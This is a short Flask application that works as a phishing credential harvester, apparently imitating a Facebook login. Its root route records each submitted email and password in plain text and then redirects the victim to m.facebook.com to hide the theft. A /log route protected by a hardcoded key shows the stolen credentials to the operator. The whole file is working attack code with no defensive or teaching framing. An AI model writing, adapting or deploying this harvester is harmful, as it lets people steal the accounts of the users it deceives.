from flask import Flask, request, render_template, redirect

app = Flask("Event")
logging = []
app_key = "jihan2001@@##"

@app.route("/log", methods=["GET","POST"])
def logs():
	global logging
	if request.method == "POST":
		key = request.form["key"]
		if key == app_key:
			return render_template("log.html", a=logging)
		else:
			return render_template("key.html", a=True)
	else:
		return render_template("key.html")

@app.route("/", methods=["GET","POST"])
def login():
	global logging
	if request.method == "POST":
		email = request.form["email"]
		password = request.form["pass"]
		if email.replace(" ","") == "" and password.replace(" ","") == "":
			return render_template("template_sec_all.html")
		else:
			if email.replace(" ","") == "":
				return render_template("template_sec_email.html")
			else:
				if password.replace(" ","") == "":
					return render_template("template_sec_pass.html")
				else:
					logging.append(f"{email}|{password}")
					return redirect("https://m.facebook.com", code=302)
	return render_template("template.html")
